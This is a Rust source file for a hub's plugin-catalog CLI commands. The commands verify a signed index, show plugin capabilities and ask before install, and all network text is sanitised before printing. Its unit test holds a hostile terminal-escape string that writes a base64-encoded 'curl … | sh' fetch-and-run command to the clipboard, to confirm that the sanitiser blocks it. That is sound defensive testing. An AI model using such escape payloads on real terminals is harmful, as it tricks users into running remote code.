//! `agora hub plugins on|off|status | update [--url URL] | key set FILE | install ID [--yes] | upgrade ID [--yes]` (ADR-0114 decision
//! 7): the owner's community plugin catalog, run on the hub's machine (the hub folder is the owner's alone). Verifying, fetching,
//! checking and keeping are `agora_hub::plugin_catalog`; this file words the outcome and asks the owner before anything is installed.
//!
//! Everything printed that came from the network or the command line (ids, names, authors, field names, the saved address) goes
//! through [`printable`] first, so a catalog cannot send the owner's terminal escape sequences.

use std::io::{BufRead, IsTerminal, Write};
use std::process::ExitCode;

use agora_hub::plugin_catalog::{
    self, EntryRefusal, InstallError, Limits, Mode, Prepared, UpdateError,
};
use agora_hub::plugin_package::{Refusal, MAX_PACKAGE_BYTES};
use agora_hub::plugins::{Plugins, MAX_PLUGINS};
use agora_hub::server;
use agora_hub::sshsig::{KeyError, SigError, MAX_KEY_TEXT};
use agora_hub::store::SqliteStore;
use agora_hub::theme_catalog::{printable, IndexError};
use agora_i18n::{key, Arg};

use crate::hubcli::{hub_dir, private_hub_dir, utc};
use crate::{Opts, Say};

const AGORA_VERSION: &str = env!("CARGO_PKG_VERSION");

pub fn hub_plugins(say: &Say, o: &Opts) -> ExitCode {
    let words: Vec<&str> = o.positional.iter().map(String::as_str).collect();
    let fits = match words.as_slice() {
        ["on" | "off" | "status"] => o.url.is_none() && !o.yes,
        ["update"] => !o.yes,
        ["key", "set", _] => o.url.is_none() && !o.yes,
        ["install" | "upgrade", _] => o.url.is_none(),
        _ => false,
    };
    // A wrong command line never creates the hub folder.
    if !fits {
        say.err(key!("cli-bad-arguments"), &[]);
        return ExitCode::from(2);
    }
    // A key file is read before the hub's database is opened, and only up to its limit.
    let key_text = match words.as_slice() {
        ["key", "set", file] => match read_key_file(file) {
            Some(t) => Some(t),
            None => {
                say.err(
                    key!("cli-hub-plugins-key-unreadable"),
                    &[("file", printable(file).into())],
                );
                return ExitCode::from(1);
            }
        },
        _ => None,
    };
    let fail = |e: String| {
        say.err(key!("cli-hub-failed"), &[("reason", e.into())]);
        ExitCode::from(1)
    };
    let dir = hub_dir(o);
    if private_hub_dir(&dir).is_err() {
        return fail(dir.display().to_string());
    }
    let store = match SqliteStore::open(&dir.join("hub.db")) {
        Ok(s) => s,
        Err(e) => return fail(e.to_string()),
    };
    match words.as_slice() {
        [op @ ("on" | "off")] => {
            if let Err(e) = plugin_catalog::set_on(&store, *op == "on", server::now_ms()) {
                return fail(e.to_string());
            }
            say_status(say, &store)
        }
        ["status"] => say_status(say, &store),
        ["update"] => {
            let url = match o.url.clone() {
                Some(u) => u,
                None => match plugin_catalog::saved_url(&store) {
                    Ok(u) => u,
                    Err(e) => return fail(e.to_string()),
                },
            };
            if url == plugin_catalog::DEFAULT_INDEX_URL {
                say.err(key!("cli-hub-plugins-no-url"), &[]);
                return ExitCode::from(2);
            }
            run_update(say, &store, &url, Limits::default())
        }
        ["key", "set", _] => set_key(say, &store, key_text.as_deref().unwrap_or("")),
        [op @ ("install" | "upgrade"), id] => {
            let mode = if *op == "install" {
                Mode::Install
            } else {
                Mode::Upgrade
            };
            let mut ask = || {
                if o.yes {
                    return Some(true);
                }
                if !std::io::stdin().is_terminal() {
                    return None;
                }
                let mut err = std::io::stderr();
                let _ = write!(err, "{} ", say.text(key!("cli-hub-plugins-confirm"), &[]));
                let _ = err.flush();
                let mut line = String::new();
                std::io::stdin().lock().read_line(&mut line).ok()?;
                Some(matches!(
                    line.trim().to_lowercase().as_str(),
                    "y" | "yes" | "e" | "evet"
                ))
            };
            run_install(say, &store, id, mode, Limits::default(), &mut ask)
        }
        _ => {
            say.err(key!("cli-bad-arguments"), &[]);
            ExitCode::from(2)
        }
    }
}

fn read_key_file(file: &str) -> Option<String> {
    use std::io::Read;
    let mut bytes = Vec::new();
    std::fs::File::open(file)
        .and_then(|f| f.take(MAX_KEY_TEXT as u64 + 1).read_to_end(&mut bytes))
        .ok()?;
    // Text over the limit is refused by the key reader as not one public key.
    Some(String::from_utf8_lossy(&bytes).into_owned())
}

fn set_key(say: &Say, store: &SqliteStore, text: &str) -> ExitCode {
    match plugin_catalog::set_key(store, text, server::now_ms()) {
        Ok(k) => {
            say.out(
                key!("cli-hub-plugins-key-set"),
                &[("fingerprint", k.fingerprint().into())],
            );
            ExitCode::SUCCESS
        }
        Err(plugin_catalog::SetKeyError::Key(KeyError::Private)) => {
            say.err(key!("cli-hub-plugins-key-private"), &[]);
            ExitCode::from(1)
        }
        Err(plugin_catalog::SetKeyError::Key(KeyError::Invalid)) => {
            say.err(key!("cli-hub-plugins-key-invalid"), &[]);
            ExitCode::from(1)
        }
        Err(plugin_catalog::SetKeyError::Store(e)) => {
            say.err(key!("cli-hub-failed"), &[("reason", e.into())]);
            ExitCode::from(1)
        }
    }
}

fn say_status(say: &Say, store: &SqliteStore) -> ExitCode {
    let s = match plugin_catalog::status(store) {
        Ok(s) => s,
        Err(e) => {
            say.err(key!("cli-hub-failed"), &[("reason", e.to_string().into())]);
            return ExitCode::from(1);
        }
    };
    say.out(
        if s.on {
            key!("cli-hub-plugins-on")
        } else {
            key!("cli-hub-plugins-off")
        },
        &[],
    );
    match &s.key {
        Some(fp) => say.out(
            key!("cli-hub-plugins-key-is"),
            &[("fingerprint", fp.clone().into())],
        ),
        None => say.out(key!("cli-hub-plugins-no-key"), &[]),
    }
    if s.updated_ms == 0 {
        say.out(key!("cli-hub-plugins-never-updated"), &[]);
    } else {
        say.out(
            key!("cli-hub-plugins-updated-at"),
            &[
                ("count", (s.plugins as i64).into()),
                ("serial", i64::try_from(s.serial).unwrap_or(i64::MAX).into()),
                ("when", utc(s.updated_ms).into()),
                ("url", printable(&s.url).into()),
            ],
        );
    }
    ExitCode::SUCCESS
}

/// `update`: exit 0 when every entry was kept, 1 when the index could not be used (nothing changed) or some entry was refused (the
/// others are kept, each refusal is said).
pub(crate) fn run_update(say: &Say, store: &SqliteStore, url: &str, limits: Limits) -> ExitCode {
    match plugin_catalog::update(store, url, limits, server::now_ms()) {
        Ok(f) => {
            for (id, r) in &f.refused {
                eprintln!("{}", refusal_line(say, id, r));
            }
            say.out(
                key!("cli-hub-plugins-updated"),
                &[
                    ("kept", (f.entries.len() as i64).into()),
                    ("refused", (f.refused.len() as i64).into()),
                    ("serial", i64::try_from(f.serial).unwrap_or(i64::MAX).into()),
                ],
            );
            // What the owner may upgrade; nothing is upgraded here.
            let installed = Plugins::new(store).list().unwrap_or_default();
            for e in &f.entries {
                if let Some(p) = installed.iter().find(|p| p.plugin_id == e.id) {
                    if agora_hub::plugin_package::compare_versions(&e.version, &p.version)
                        == std::cmp::Ordering::Greater
                    {
                        say.out(
                            key!("cli-hub-plugins-newer"),
                            &[
                                ("id", printable(&e.id).into()),
                                ("old", printable(&p.version).into()),
                                ("new", printable(&e.version).into()),
                            ],
                        );
                    }
                }
            }
            if !plugin_catalog::is_on(store).unwrap_or(false) {
                say.out(key!("cli-hub-plugins-still-off"), &[]);
            }
            if f.refused.is_empty() {
                ExitCode::SUCCESS
            } else {
                ExitCode::from(1)
            }
        }
        Err(e) => {
            say.err(
                key!("cli-hub-plugins-failed"),
                &[("reason", update_text(say, &e).into())],
            );
            ExitCode::from(1)
        }
    }
}

/// `install` / `upgrade`: fetch and check, show what it asks to see (for an upgrade what changed, capabilities first), ask (`ask`:
/// `Some(true)` yes, `Some(false)` no, `None` nobody to ask), and only then keep it.
pub(crate) fn run_install(
    say: &Say,
    store: &SqliteStore,
    id: &str,
    mode: Mode,
    limits: Limits,
    ask: &mut dyn FnMut() -> Option<bool>,
) -> ExitCode {
    let p = match plugin_catalog::prepare(store, id, mode, AGORA_VERSION, limits, server::now_ms())
    {
        Ok(p) => p,
        Err(e) => {
            say.err(
                key!("cli-hub-plugins-not-installed"),
                &[("reason", install_text(say, id, &e).into())],
            );
            return ExitCode::from(1);
        }
    };
    for line in summary_lines(say, &p) {
        say.out(key!("cli-hub-plugins-line"), &[("text", line.into())]);
    }
    match ask() {
        Some(true) => {}
        answer => {
            plugin_catalog::declined(store, &p, server::now_ms());
            say.err(
                if answer.is_none() {
                    key!("cli-hub-plugins-needs-yes")
                } else {
                    key!("cli-hub-plugins-declined")
                },
                &[],
            );
            return ExitCode::from(1);
        }
    }
    match plugin_catalog::commit(store, &p, AGORA_VERSION, server::now_ms()) {
        Ok(a) => {
            say.out(
                match mode {
                    Mode::Install => key!("cli-hub-plugins-installed"),
                    Mode::Upgrade => key!("cli-hub-plugins-upgraded"),
                },
                &[
                    ("id", printable(&a.id).into()),
                    ("name", printable(&a.name).into()),
                    ("version", printable(&a.version).into()),
                ],
            );
            ExitCode::SUCCESS
        }
        Err(e) => {
            say.err(
                key!("cli-hub-plugins-not-installed"),
                &[("reason", install_text(say, id, &e).into())],
            );
            ExitCode::from(1)
        }
    }
}

fn caps(list: &[String]) -> Arg {
    if list.is_empty() {
        "-".into()
    } else {
        printable(&list.join(", ")).into()
    }
}

/// What the owner is shown before being asked. An upgrade's capability changes come first.
pub(crate) fn summary_lines(say: &Say, p: &Prepared) -> Vec<String> {
    let e = &p.entry;
    let mut out = Vec::new();
    match (p.mode, &p.installed) {
        (Mode::Upgrade, Some(old)) => {
            out.push(say.text(
                key!("cli-hub-plugins-upgrade-asks"),
                &[("id", printable(&e.id).into())],
            ));
            if !p.diff.added.is_empty() {
                out.push(say.text(
                    key!("cli-hub-plugins-caps-added"),
                    &[("capabilities", caps(&p.diff.added))],
                ));
            }
            if !p.diff.removed.is_empty() {
                out.push(say.text(
                    key!("cli-hub-plugins-caps-removed"),
                    &[("capabilities", caps(&p.diff.removed))],
                ));
            }
            if p.diff.added.is_empty() && p.diff.removed.is_empty() {
                out.push(say.text(key!("cli-hub-plugins-caps-same"), &[]));
            }
            out.push(say.text(
                key!("cli-hub-plugins-caps-kept"),
                &[("capabilities", caps(&p.diff.kept))],
            ));
            out.push(say.text(
                key!("cli-hub-plugins-upgrade-version"),
                &[
                    ("name", printable(&e.name).into()),
                    ("old", printable(old).into()),
                    ("new", printable(&e.version).into()),
                    ("author", printable(&e.author).into()),
                    ("licence", printable(&e.licence).into()),
                ],
            ));
        }
        _ => {
            out.push(say.text(
                key!("cli-hub-plugins-install-asks"),
                &[
                    ("id", printable(&e.id).into()),
                    ("capabilities", caps(&p.diff.added)),
                ],
            ));
            out.push(say.text(
                key!("cli-hub-plugins-install-what"),
                &[
                    ("name", printable(&e.name).into()),
                    ("version", printable(&e.version).into()),
                    ("author", printable(&e.author).into()),
                    ("licence", printable(&e.licence).into()),
                ],
            ));
        }
    }
    if !e.description.is_empty() {
        out.push(printable(&e.description));
    }
    out
}

fn refusal_line(say: &Say, id: &str, r: &EntryRefusal) -> String {
    let reason = match r {
        EntryRefusal::Field(f) => say.text(
            key!("cli-hub-plugins-refused-field"),
            &[("field", (*f).into())],
        ),
        EntryRefusal::UnknownField(f) => say.text(
            key!("cli-hub-plugins-refused-unknown-field"),
            &[("field", printable(f).into())],
        ),
        EntryRefusal::Duplicate => say.text(key!("cli-hub-plugins-refused-duplicate"), &[]),
    };
    say.text(
        key!("cli-hub-plugins-refused"),
        &[("id", printable(id).into()), ("reason", reason.into())],
    )
}

fn kib(n: usize) -> Arg {
    ((n / 1024) as i64).into()
}

pub(crate) fn fetch_text(say: &Say, e: &IndexError, max: usize) -> String {
    match e {
        IndexError::Address => say.text(key!("cli-hub-plugins-fetch-address"), &[]),
        IndexError::Fetch => say.text(key!("cli-hub-plugins-fetch-fetch"), &[]),
        IndexError::TimedOut => say.text(key!("cli-hub-plugins-fetch-timeout"), &[]),
        IndexError::Status(s) => say.text(
            key!("cli-hub-plugins-fetch-status"),
            &[("status", i64::from(*s).into())],
        ),
        IndexError::TooLarge => say.text(
            key!("cli-hub-plugins-fetch-too-large"),
            &[("max", kib(max))],
        ),
        IndexError::Json => say.text(key!("cli-hub-plugins-index-json"), &[]),
        IndexError::Format => say.text(key!("cli-hub-plugins-index-format"), &[]),
        IndexError::Newer => say.text(key!("cli-hub-plugins-index-newer"), &[]),
        IndexError::UnknownField(f) => say.text(
            key!("cli-hub-plugins-index-unknown-field"),
            &[("field", printable(f).into())],
        ),
        IndexError::TooMany => say.text(
            key!("cli-hub-plugins-index-too-many"),
            &[("max", (plugin_catalog::MAX_ENTRIES as i64).into())],
        ),
    }
}

fn sig_text(say: &Say, e: SigError) -> String {
    match e {
        SigError::Malformed => say.text(key!("cli-hub-plugins-signature-malformed"), &[]),
        SigError::WrongKey => say.text(key!("cli-hub-plugins-signature-wrong-key"), &[]),
        SigError::Namespace => say.text(key!("cli-hub-plugins-signature-namespace"), &[]),
        SigError::Invalid => say.text(key!("cli-hub-plugins-signature-invalid"), &[]),
    }
}

pub(crate) fn update_text(say: &Say, e: &UpdateError) -> String {
    match e {
        UpdateError::NoKey => say.text(key!("cli-hub-plugins-no-key"), &[]),
        UpdateError::Index(i) => say.text(
            key!("cli-hub-plugins-index"),
            &[(
                "reason",
                fetch_text(say, i, plugin_catalog::MAX_INDEX_BYTES).into(),
            )],
        ),
        UpdateError::SignatureFetch(i) => say.text(
            key!("cli-hub-plugins-signature-fetch"),
            &[(
                "reason",
                fetch_text(say, i, agora_hub::sshsig::MAX_SIGNATURE_TEXT).into(),
            )],
        ),
        UpdateError::Signature(s) => sig_text(say, *s),
        UpdateError::Rollback { seen, offered } => say.text(
            key!("cli-hub-plugins-rollback"),
            &[
                ("seen", i64::try_from(*seen).unwrap_or(i64::MAX).into()),
                (
                    "offered",
                    i64::try_from(*offered).unwrap_or(i64::MAX).into(),
                ),
            ],
        ),
        UpdateError::SerialReused { serial } => say.text(
            key!("cli-hub-plugins-serial-reused"),
            &[("serial", i64::try_from(*serial).unwrap_or(i64::MAX).into())],
        ),
        UpdateError::Store(s) => printable(s),
    }
}

fn package_text(say: &Say, code: Refusal, detail: &str) -> String {
    let k = match code {
        Refusal::TooLarge => key!("cli-hub-plugin-error-too-large"),
        Refusal::Format => key!("cli-hub-plugin-error-format"),
        Refusal::NewerFormat => key!("cli-hub-plugin-error-newer-format"),
        Refusal::TooMany => key!("cli-hub-plugin-error-too-many"),
        Refusal::Path => key!("cli-hub-plugin-error-path"),
        Refusal::Link => key!("cli-hub-plugin-error-link"),
        Refusal::Type => key!("cli-hub-plugin-error-type"),
        Refusal::Manifest => key!("cli-hub-plugin-error-manifest"),
        Refusal::Capability => key!("cli-hub-plugin-error-capability"),
        Refusal::Unlisted => key!("cli-hub-plugin-error-unlisted"),
        Refusal::Missing => key!("cli-hub-plugin-error-missing"),
        Refusal::Hash => key!("cli-hub-plugin-error-hash"),
        Refusal::Newer => key!("cli-hub-plugin-error-newer"),
    };
    say.text(k, &[("detail", printable(detail).into())])
}

pub(crate) fn install_text(say: &Say, id: &str, e: &InstallError) -> String {
    let id = printable(&id.chars().take(40).collect::<String>());
    match e {
        InstallError::Off => say.text(key!("cli-hub-plugins-install-off"), &[]),
        InstallError::NoKey => say.text(key!("cli-hub-plugins-no-key"), &[]),
        InstallError::NotVerified => say.text(key!("cli-hub-plugins-install-not-verified"), &[]),
        InstallError::NotInCatalog => say.text(
            key!("cli-hub-plugins-install-not-in-catalog"),
            &[("id", id.into())],
        ),
        InstallError::Installed(v) => say.text(
            key!("cli-hub-plugins-install-installed"),
            &[("id", id.into()), ("version", printable(v).into())],
        ),
        InstallError::NotInstalled => say.text(
            key!("cli-hub-plugins-install-not-installed"),
            &[("id", id.into())],
        ),
        InstallError::NotNewer { installed, offered } => say.text(
            key!("cli-hub-plugins-install-not-newer"),
            &[
                ("id", id.into()),
                ("installed", printable(installed).into()),
                ("offered", printable(offered).into()),
            ],
        ),
        InstallError::Fetch(i) => say.text(
            key!("cli-hub-plugins-install-fetch"),
            &[("reason", fetch_text(say, i, MAX_PACKAGE_BYTES).into())],
        ),
        InstallError::Size => say.text(key!("cli-hub-plugins-install-size"), &[]),
        InstallError::Hash => say.text(key!("cli-hub-plugins-install-hash"), &[]),
        InstallError::Package(r) => package_text(say, r.code, r.detail.as_deref().unwrap_or("")),
        InstallError::Mismatch(f) => say.text(
            key!("cli-hub-plugins-install-mismatch"),
            &[("field", (*f).into())],
        ),
        InstallError::Full => say.text(
            key!("cli-hub-plugin-full"),
            &[("limit", (MAX_PLUGINS as i64).into())],
        ),
        InstallError::Declined => say.text(key!("cli-hub-plugins-declined"), &[]),
        InstallError::Changed(_) => say.text(key!("cli-hub-plugins-install-changed"), &[]),
        InstallError::Store(s) => printable(s),
    }
}

#[cfg(test)]
#[allow(clippy::unwrap_used, clippy::expect_used)]
mod tests {
    use super::*;
    use agora_i18n::Catalog;

    /// Every refusal, problem and outcome has a sentence in both locales, and nothing from the catalog reaches the terminal as an
    /// escape sequence (a clipboard write by OSC 52, a cleared screen, text turned around).
    #[test]
    fn every_outcome_has_a_sentence_and_none_carries_an_escape() {
        let evil = "\u{1b}]52;c;Y3VybCBlLmNvfHNoCg==\u{7}\u{1b}[2J\u{202e}x\nFAKE";
        let bad = |s: &str| {
            s.starts_with("cli-")
                || s.contains("{ $")
                || s.chars()
                    .any(|c| c.is_control() || agora_core::text::is_hidden(c))
        };
        let index_errors = [
            IndexError::Address,
            IndexError::Fetch,
            IndexError::TimedOut,
            IndexError::Status(301),
            IndexError::TooLarge,
            IndexError::Json,
            IndexError::Format,
            IndexError::Newer,
            IndexError::UnknownField(evil.into()),
            IndexError::TooMany,
        ];
        for say in [Say(Catalog::english()), Say(Catalog::turkish())] {
            let mut lines = Vec::new();
            for i in &index_errors {
                lines.push(update_text(&say, &UpdateError::Index(i.clone())));
                lines.push(update_text(&say, &UpdateError::SignatureFetch(i.clone())));
                lines.push(install_text(&say, evil, &InstallError::Fetch(i.clone())));
            }
            for s in [
                SigError::Malformed,
                SigError::WrongKey,
                SigError::Namespace,
                SigError::Invalid,
            ] {
                lines.push(update_text(&say, &UpdateError::Signature(s)));
            }
            lines.push(update_text(&say, &UpdateError::NoKey));
            lines.push(update_text(
                &say,
                &UpdateError::Rollback {
                    seen: 5,
                    offered: 4,
                },
            ));
            lines.push(update_text(&say, &UpdateError::SerialReused { serial: 4 }));
            for e in [
                InstallError::Off,
                InstallError::NoKey,
                InstallError::NotVerified,
                InstallError::NotInCatalog,
                InstallError::Installed(evil.into()),
                InstallError::NotInstalled,
                InstallError::NotNewer {
                    installed: evil.into(),
                    offered: "1.0.0".into(),
                },
                InstallError::Size,
                InstallError::Hash,
                InstallError::Package(agora_hub::plugin_package::Refused {
                    code: Refusal::Path,
                    detail: Some(evil.into()),
                }),
                InstallError::Mismatch("capabilities"),
                InstallError::Full,
                InstallError::Declined,
                InstallError::Changed("catalog"),
                InstallError::Changed("installed"),
            ] {
                lines.push(install_text(&say, evil, &e));
            }
            for r in [
                EntryRefusal::Field("capabilities"),
                EntryRefusal::UnknownField(evil.into()),
                EntryRefusal::Duplicate,
            ] {
                lines.push(refusal_line(&say, evil, &r));
            }
            for k in [
                key!("cli-hub-plugins-on"),
                key!("cli-hub-plugins-off"),
                key!("cli-hub-plugins-never-updated"),
                key!("cli-hub-plugins-no-url"),
                key!("cli-hub-plugins-still-off"),
                key!("cli-hub-plugins-confirm"),
                key!("cli-hub-plugins-needs-yes"),
                key!("cli-hub-plugins-key-private"),
                key!("cli-hub-plugins-key-invalid"),
                key!("cli-hub-plugins-caps-same"),
            ] {
                lines.push(say.text(k, &[]));
            }
            for line in &lines {
                assert!(!bad(line), "{line:?}");
            }
            assert!(lines.iter().any(|l| l.contains(r"\u{1b}]52;c;")));
        }
    }
}
